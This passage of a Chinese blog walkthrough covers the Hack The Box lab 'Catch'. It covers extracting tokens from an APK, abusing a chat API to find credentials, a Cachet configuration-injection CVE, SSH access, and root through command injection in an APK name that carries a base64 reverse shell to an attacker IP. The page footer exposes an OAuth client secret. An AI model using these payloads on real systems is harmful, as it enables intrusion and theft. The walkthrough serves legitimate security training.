+:: Progress: [20116/20116] :: Job [1/1] :: 77 req/sec :: Duration: [0:05:20] :: Errors: 0 ::
+</code></pre>
+<p>东西还挺多，去看一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/e7bfff2a-25b5-4df6-b1d5-ec6a13a98e2d.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>提示 Unauthorized 没有令牌嘛，毕竟没有登陆</p>
+<h3 id="8000-端口"><a href="#8000-端口" class="headerlink" title="8000 端口"></a>8000 端口</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/bc93a10b-b3a3-4e7e-9352-9c5fd13ed739.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>似乎是一个系统运行监控的，然后点击下面的仪表盘会进入一个登录页面</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/98515bd6-0376-4759-867d-e96c2584c7b8.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>试了几个弱口令都无法进去，去看看 apk 文件吧</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://10.10.11.150:8000/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.150:8000/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+admin                   [Status: 302, Size: 386, Words: 60, Lines: 12]
+img                     [Status: 301, Size: 317, Words: 20, Lines: 10]
+fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10]
+setup                   [Status: 302, Size: 382, Words: 60, Lines: 12]
+dashboard               [Status: 302, Size: 386, Words: 60, Lines: 12]
+storage                 [Status: 403, Size: 279, Words: 20, Lines: 10]
+dist                    [Status: 301, Size: 318, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
+                        [Status: 200, Size: 8870, Words: 1951, Lines: 302]
+:: Progress: [20116/20116] :: Job [1/1] :: 70 req/sec :: Duration: [0:05:55] :: Errors: 0 ::
+</code></pre>
+<p>也没啥可看的东西</p>
+<h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><p>使用 apktool 进行反编译</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/catch]
+└─# apktool d catchv1.0.apk 
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+I: Using Apktool 2.5.0-dirty on catchv1.0.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+</code></pre>
+<p>然后查找一下 token</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/catch]
+└─# grep -rn token catchv1.0/res/values/strings.xml
+43:    &lt;string name=&quot;gitea_token&quot;&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt;
+47:    &lt;string name=&quot;lets_chat_token&quot;&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt;
+104:    &lt;string name=&quot;slack_token&quot;&gt;xoxp-23984754863-2348975623103&lt;/string&gt;
+</code></pre>
+<p>在 <code>/catchv1.0/res/values/string.xml</code> 下的第 47 行有一个 <code>lets_chat_token</code> ，应该就是这个了，来利用一下吧</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>使用令牌授权进行读取</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# curl -H &#39;Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&#39; &#39;http://10.10.11.150:5000/rooms&#39;
+[{&quot;id&quot;:&quot;61b86b28d984e2451036eb17&quot;,&quot;slug&quot;:&quot;status&quot;,&quot;name&quot;:&quot;Status&quot;,&quot;description&quot;:&quot;Cachet Updates and Maintenance&quot;,&quot;lastActive&quot;:&quot;2021-12-14T10:34:20.749Z&quot;,&quot;created&quot;:&quot;2021-12-14T10:00:08.384Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;private&quot;:false,&quot;hasPassword&quot;:false,&quot;participants&quot;:[]},{&quot;id&quot;:&quot;61b8708efe190b466d476bfb&quot;,&quot;slug&quot;:&quot;android_dev&quot;,&quot;name&quot;:&quot;Android Development&quot;,&quot;description&quot;:&quot;Android App Updates, Issues &amp; More&quot;,&quot;lastActive&quot;:&quot;2021-12-14T10:24:21.145Z&quot;,&quot;created&quot;:&quot;2021-12-14T10:23:10.474Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;private&quot;:false,&quot;hasPassword&quot;:false,&quot;participants&quot;:[]},{&quot;id&quot;:&quot;61b86b3fd984e2451036eb18&quot;,&quot;slug&quot;:&quot;employees&quot;,&quot;name&quot;:&quot;Employees&quot;,&quot;description&quot;:&quot;New Joinees, Org updates&quot;,&quot;lastActive&quot;:&quot;2021-12-14T10:18:04.710Z&quot;,&quot;created&quot;:&quot;2021-12-14T10:00:31.043Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;private&quot;:false,&quot;hasPassword&quot;:false,&quot;participants&quot;:[]}]
+</code></pre>
+<p>读取一下 rooms 的内容</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# curl -H &#39;Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&#39; &#39;http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages&#39;
+[{&quot;id&quot;:&quot;61b8732cfe190b466d476c02&quot;,&quot;text&quot;:&quot;ah sure!&quot;,&quot;posted&quot;:&quot;2021-12-14T10:34:20.749Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b8731ffe190b466d476c01&quot;,&quot;text&quot;:&quot;You should actually include this task to your list as well as a part of quarterly audit&quot;,&quot;posted&quot;:&quot;2021-12-14T10:34:07.449Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b872b9fe190b466d476c00&quot;,&quot;text&quot;:&quot;Also make sure we&#39;ve our systems, applications and databases up-to-date.&quot;,&quot;posted&quot;:&quot;2021-12-14T10:32:25.514Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87282fe190b466d476bff&quot;,&quot;text&quot;:&quot;Excellent! &quot;,&quot;posted&quot;:&quot;2021-12-14T10:31:30.403Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87277fe190b466d476bfe&quot;,&quot;text&quot;:&quot;Why not. We&#39;ve this in our todo list for next quarter&quot;,&quot;posted&quot;:&quot;2021-12-14T10:31:19.094Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87241fe190b466d476bfd&quot;,&quot;text&quot;:&quot;@john is it possible to add SSL to our status domain to make sure everything is secure ? &quot;,&quot;posted&quot;:&quot;2021-12-14T10:30:25.108Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b8702dfe190b466d476bfa&quot;,&quot;text&quot;:&quot;Here are the credentials `john :  E}V!mywu_69T4C}W`&quot;,&quot;posted&quot;:&quot;2021-12-14T10:21:33.859Z&quot;,&quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87010fe190b466d476bf9&quot;,&quot;text&quot;:&quot;Sure one sec.&quot;,&quot;posted&quot;:&quot;2021-12-14T10:21:04.635Z&quot;,&quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b86fb1fe190b466d476bf8&quot;,&quot;text&quot;:&quot;Can you create an account for me ? &quot;,&quot;posted&quot;:&quot;2021-12-14T10:19:29.677Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b86f4dfe190b466d476bf6&quot;,&quot;text&quot;:&quot;Hey Team! I&#39;ll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. &quot;,&quot;posted&quot;:&quot;2021-12-14T10:17:49.761Z&quot;,&quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}]
+</code></pre>
+<p>继续读取一下房间内的消息</p>
+<pre><code class="bash">username = john
+password = E}V!mywu_69T4C}W
+</code></pre>
+<p>这里从上面的内容中提取到了一组账号密码</p>
+<p>拿到 8000 端口去登陆试试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/805be4eb-bf6f-43a6-81e3-7ed44cdda94c.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>成功登陆，到处看看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/9ef80eaa-402e-4a74-8020-501117eb15d7.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>我们可以看到，这是一个 cachet 的服务器，去搜索一下漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/1f547117-160c-4b87-ad11-3867a76705fa.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>找到了一篇 Cachet 2.4：通过 Laravel 配置注入执行代码 CVE-2021-39165</p>
+<blockquote>
+<p><a href="https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection" target="_blank" rel="noopener">https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection</a></p>
+</blockquote>
+<p>根据文章描述，拦截 EMAIL 的包，将内容修改为注入语句就行了</p>
+<p>修改为 ${DB_USERNAME}</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/315e86c7-732c-4c23-acfe-1e3360e4907f.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>修改为 ${DB_PASSWORD}</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/69151011-17e6-49a2-9f9f-12f2ab7edb88.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<pre><code class="bash">username = will
+passowrd = s2#4Fg0_%3!
+</code></pre>
+<p>得到了一组账号密码，去登陆 ssh</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ssh will@10.10.11.150
+will@10.10.11.150&#39;s password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 06 Apr 2022 08:41:02 AM UTC
+
+  System load:                      0.19
+  Usage of /:                       75.6% of 16.61GB
+  Memory usage:                     83%
+  Swap usage:                       33%
+  Processes:                        448
+  Users logged in:                  0
+  IPv4 address for br-535b7cf3a728: 172.18.0.1
+  IPv4 address for br-fe1b5695b604: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.150
+  IPv6 address for eth0:            dead:beef::250:56ff:feb9:ffd
+
+0 updates can be applied immediately.
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Wed Apr  6 08:40:51 2022 from 10.10.14.9
+will@catch:~$ whoami&amp;&amp;id
+will
+uid=1000(will) gid=1000(will) groups=1000(will)
+</code></pre>
+<p>登陆成功</p>
+<pre><code class="bash">will@catch:~$ ls
+user.txt
+will@catch:~$ cat user.txt 
+24b48fcc5b166f68a855af04633081c7
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre><code class="bash">will@catch:~$ sudo -l
+[sudo] password for will: 
+Sorry, user will may not run sudo on catch.
+</code></pre>
+<p>查看 sudo -l 失败，那看来不是这个提权思路了</p>
+<p>去跑了一下 linpeas.sh</p>
+<pre><code class="bash">[+] Readable files belonging to root and readable by me but not world readable
+-rwxr-x--x+ 1 root root 1894 Mar  3 14:23 /opt/mdm/verify.sh
+-rw-r----- 1 root will 33 Apr  5 17:23 /home/will/user.txt
+</code></pre>
+<p>这里看到有一个 &#x2F;opt&#x2F;mdm&#x2F;verify.sh 文件，去进程搜一下</p>
+<pre><code class="bash">will@catch:~$ ps auxw|grep verify.sh
+will      386873  0.0  0.0   6436   656 pts/0    S+   08:59   0:00 grep --color=auto verify.sh
+</code></pre>
+<p>也有运行记录，去查看一下文件</p>
+<pre><code class="bash">will@catch:~$ cat /opt/mdm/verify.sh
+#!/bin/bash
+
+###################
+# Signature Check #
+###################
+
+sig_check() {
+        jarsigner -verify &quot;$1/$2&quot; 2&gt;/dev/null &gt;/dev/null
+        if [[ $? -eq 0 ]]; then
+                echo &#39;[+] Signature Check Passed&#39;
+        else
+                echo &#39;[!] Signature Check Failed. Invalid Certificate.&#39;
+                cleanup
+                exit
+        fi
+}
+
+#######################
+# Compatibility Check #
+#######################
+
+comp_check() {
+        apktool d -s &quot;$1/$2&quot; -o $3 2&gt;/dev/null &gt;/dev/null
+        COMPILE_SDK_VER=$(grep -oPm1 &quot;(?&lt;=compileSdkVersion=\&quot;)[^\&quot;]+&quot; &quot;$PROCESS_BIN/AndroidManifest.xml&quot;)
+        if [ -z &quot;$COMPILE_SDK_VER&quot; ]; then
+                echo &#39;[!] Failed to find target SDK version.&#39;
+                cleanup
+                exit
+        else
+                if [ $COMPILE_SDK_VER -lt 18 ]; then
+                        echo &quot;[!] APK Doesn&#39;t meet the requirements&quot;
+                        cleanup
+                        exit
+                fi
+        fi
+}
+
+####################
+# Basic App Checks #
+####################
+
+app_check() {
+        APP_NAME=$(grep -oPm1 &quot;(?&lt;=&lt;string name=\&quot;app_name\&quot;&gt;)[^&lt;]+&quot; &quot;$1/res/values/strings.xml&quot;)
+        echo $APP_NAME
+        if [[ $APP_NAME == *&quot;Catch&quot;* ]]; then
+                echo -n $APP_NAME|xargs -I {} sh -c &#39;mkdir {}&#39;
+                mv &quot;$3/$APK_NAME&quot; &quot;$2/$APP_NAME/$4&quot;
+        else
+                echo &quot;[!] App doesn&#39;t belong to Catch Global&quot;
+                cleanup
+                exit
+        fi
+}
+
+###########
+# Cleanup #
+###########
+
+cleanup() {
+        rm -rf $PROCESS_BIN;rm -rf &quot;$DROPBOX/*&quot; &quot;$IN_FOLDER/*&quot;;rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)
+}
+
+###################
+# MDM CheckerV1.0 #
+###################
+
+DROPBOX=/opt/mdm/apk_bin
+IN_FOLDER=/root/mdm/apk_bin
+OUT_FOLDER=/root/mdm/certified_apps
+PROCESS_BIN=/root/mdm/process_bin
+
+for IN_APK_NAME in $DROPBOX/*.apk;do
+        OUT_APK_NAME=&quot;$(echo ${IN_APK_NAME##*/} | cut -d &#39;.&#39; -f1)_verified.apk&quot;
+        APK_NAME=&quot;$(openssl rand -hex 12).apk&quot;
+        if [[ -L &quot;$IN_APK_NAME&quot; ]]; then
+                exit
+        else
+                mv &quot;$IN_APK_NAME&quot; &quot;$IN_FOLDER/$APK_NAME&quot;
+        fi
+        sig_check $IN_FOLDER $APK_NAME
+        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
+        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
+done
+cleanup
+</code></pre>
+<p>这里的 app_check() 函数有问题</p>
+<p>它在 &#x2F;res&#x2F;values&#x2F;strings.xml 的 APK 中搜索 APP_NAME</p>
+<p>我们可以利用一下 做一个命令注入</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1&#39;|base64
+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg==
+
+┌──(root💀kali)-[~/Desktop]
+└─# echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg==|base64 -d
+/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1
+</code></pre>
+<p>然后编写一下 payload</p>
+<pre><code class="bash">&lt;string name=&quot;app_name&quot;&gt;Catch|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg== | base64 -d | bash&lt;/string&gt;
+</code></pre>
+<p>然后使用上面的 payload 替换 &#x2F;res&#x2F;values&#x2F;strings.xml 的第 30 行 app_name 这一行</p>
+<p>接着使用 nc -nvlp 监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<p>然后去使用 github 上最新版本 2.6.1 的 apktool 来打包构造新的 app</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/catch]
+└─# java -jar apktool_2.6.1.jar b -f -d catchv1.0 -o catchv2.0.apk                                                                        1 ⨯
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+I: Using Apktool 2.6.1
+I: Smaling smali folder into classes.dex...
+I: Building resources...
+I: Building apk file...
+I: Copying unknown files/dir...
+I: Built apk...
+
+┌──(root💀kali)-[~/Desktop/catch]
+└─# ls
+apktool_2.6.1.jar  catchv1.0  catchv1.0.apk  catchv2.0.apk
+</code></pre>
+<p>然后去给 apk 签名，并且验证</p>
+<pre><code class="bash">keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore catchv2.0.apk alias_name
+
+jarsigner -verify -verbose -certs catchv2.0.apk
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/catch]
+└─# keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+输入密钥库口令:  
+再次输入新口令: 
+您的名字与姓氏是什么?
+  [Unknown]:  
+您的组织单位名称是什么?
+  [Unknown]:  
+您的组织名称是什么?
+  [Unknown]:  
+您所在的城市或区域名称是什么?
+  [Unknown]:  
+您所在的省/市/自治区名称是什么?
+  [Unknown]:  
+该单位的双字母国家/地区代码是什么?
+  [Unknown]:  
+CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown是否正确?
+  [否]:  y
+
+正在为以下对象生成 2,048 位RSA密钥对和自签名证书 (SHA256withRSA) (有效期为 10,000 天):
+         CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown
+[正在存储my-release-key.keystore]
+
+┌──(root💀kali)-[~/Desktop/catch]
+└─# ls my-release-key.keystore 
+my-release-key.keystore
+</code></pre>
+<p>生成了一个签名文件，然后验证内容较多，就不放出来了，大家自行验证即可</p>
+<p>使用 python3 -m 开启一个 HTTP 服务器</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/catch]
+└─# python3 -m http.server 80 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+<p>然后使用 wget 下载这个 apk</p>
+<pre><code class="bash">will@catch:~$ wget http://10.10.14.9/catchv2.0.apk
+--2022-04-06 09:28:38--  http://10.10.14.9/catchv2.0.apk
+Connecting to 10.10.14.9:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2821343 (2.7M) [application/vnd.android.package-archive]
+Saving to: ‘catchv2.0.apk’
+
+catchv2.0.apk                       100%[=================================================================&gt;]   2.69M   869KB/s    in 3.2s    
+
+2022-04-06 09:28:42 (869 KB/s) - ‘catchv2.0.apk’ saved [2821343/2821343]
+</code></pre>
+<p>然后将下载的 apk 放入 <code>/opt/mdm/apk_bin</code> 文件夹</p>
+<pre><code class="bash">will@catch:~$ cp catchv2.0.apk /opt/mdm/apk_bin
+will@catch:~$ ls /opt/mdm/apk_bin
+catchv2.0.apk
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444                                       
+listening on [any] 4444 ...
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.150] 34410
+bash: cannot set terminal process group (397832): Inappropriate ioctl for device
+bash: no job control in this shell
+root@catch:~# whoami&amp;&amp;id
+whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>然后等待一会儿，我们就会获得一个 root 权限的 shell</p>
+<pre><code class="bash">root@catch:~# cd /root
+cd /root
+root@catch:~# cat root.txt
+cat root.txt
+36160af074e848d9139b7d14c9c4e5ca
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/&title=《Catch - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/&title=《Catch - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Catch - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/04/07/Hackthebox%20-%20Sense%20/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Sense - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/04/04/Hackthebox%20-%20Shocker/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Shocker - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/&title=《Catch - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/&title=《Catch - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
